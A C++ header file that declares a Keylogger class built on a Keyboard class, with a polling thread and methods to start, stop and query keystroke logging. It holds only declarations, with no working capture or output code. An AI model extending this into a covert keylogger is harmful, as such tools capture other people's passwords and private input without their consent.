#pragma once
#include <thread>

#include "keyboard.h"

class Keylogger : public Keyboard {
private:
	std::thread* keylog;

	void setKeysState();
	void handleOutput();

public:
	Keylogger(milliseconds polling);

	void startKeylog();
	void stopKeylog();
	bool isKeylogging();
};